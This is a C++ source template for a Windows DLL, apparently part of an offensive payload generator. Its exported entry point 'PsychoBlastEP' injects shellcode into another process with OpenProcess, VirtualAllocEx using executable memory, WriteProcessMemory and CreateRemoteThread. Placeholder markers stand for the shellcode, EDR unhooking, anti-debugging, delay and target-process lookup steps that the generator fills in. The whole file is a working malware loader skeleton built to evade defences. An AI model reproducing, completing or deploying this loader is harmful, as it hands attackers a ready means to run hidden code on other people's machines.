// Bison.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma.
//
#define _CRT_SECURE_NO_WARNINGS
#define MAX_ARGS 100
#define MAX_ARG_LENGTH 255

#include <windows.h>
#include <processenv.h>
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

//####USING####

//####DEFINE####

//####CODE####

extern "C" __declspec(dllexport) void CALLBACK PsychoBlastEP(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

DWORD WINAPI PsychoBlast(LPVOID lpParameter)
{

	//####UNHOOK####

	int pid = 0;
	// WARNING: THIS TEMPLATE NEED FIND PROCESS!!
    //####FIND_PROCESS####

    int length = ####SHELLCODE_LENGTH####;
    unsigned char* encoded = ####SHELLCODE####;

    //####CALL####

    unsigned char* decoded = encoded;


	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, length, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, decoded, length, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

    return 0;
}

void CALLBACK PsychoBlastEP(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    //####DELAY####
    //####ANTIDEBUG####
    PsychoBlast(NULL);
}

